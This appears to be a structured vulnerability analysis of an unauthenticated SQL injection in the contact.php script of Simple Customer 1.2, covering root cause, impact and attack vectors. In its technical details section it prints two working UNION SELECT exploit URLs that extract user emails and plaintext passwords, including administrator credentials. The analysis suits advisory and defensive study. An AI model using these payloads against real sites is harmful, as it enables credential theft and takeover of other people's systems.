Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:**
The root cause of the vulnerability is the lack of input sanitization in the `contact.php` script of Simple Customer 1.2. The script directly uses `$_GET` variables in SQL queries without any sanitization.

**Weaknesses/Vulnerabilities Present:**
- SQL Injection vulnerability in `contact.php`

**Impact of Exploitation:**
- An attacker can extract sensitive information from the database. Specifically, the provided examples demonstrate the ability to retrieve user credentials (email and password) from the `users` table, including administrative credentials.
- Further SQL injection could allow modification or deletion of data.

**Attack Vectors:**
- HTTP GET requests to the `contact.php` script with specially crafted `id` parameters.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the web application. No prior authentication is required to exploit the vulnerability.
- The attacker needs knowledge of SQL syntax.

**Technical Details:**
The exploit examples provided demonstrate how to leverage the SQL injection vulnerability:

*   **Admin user/pass retrieval:**
    ```
    http://site.com/contact.php?id=1/**/UNION/**/ALL/**/SELECT/**/1,CONCAT(user_email,char(58),user_password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/**/FROM/**/users/**/WHERE/**/user_level=1/*
    ```
    This URL crafts a UNION SELECT statement to fetch the `user_email` and `user_password` fields from the `users` table, specifically where `user_level` is 1 (admin).
*   **User retrieval:**
    ```
    http://site.com/contact.php?id=1/**/UNION/**/ALL/**/SELECT/**/1,CONCAT(user_email,char(58),user_password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/**/FROM/**/users/**/LIMIT/**/0,1/*
    ```
    This URL is similar to the previous one, but includes a `LIMIT` clause to retrieve only the first user record.

**Additional Notes:**
- Passwords are stored in plain text.
- The vendor has not been notified about the vulnerability.
- Multiple vulnerable queries exist in the application.
